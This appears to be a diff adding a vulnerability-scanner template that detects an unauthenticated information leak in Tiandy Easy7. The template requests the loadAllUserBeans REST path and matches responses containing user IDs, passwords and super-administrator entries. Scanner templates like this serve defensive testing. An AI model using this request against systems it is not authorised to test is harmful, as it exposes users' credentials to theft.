@@ -1,0 +1,25 @@
+id: tiandy-easy7-loadAllUserBeans-info-leak
+info:
+  name: Tiandy Easy7 loadAllUserBeans Information Leak
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: info-leak, easy7
+http:
+  - method: GET
+    path:
+      - "/Easy7/rest/user/loadAllUserBeans"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"userId\":"
+          - "\"password\":"
+          - "\"userCaption\":"
+          - "超级管理员"
+      - type: word
+        words:
+          - "<"
+        negative: true
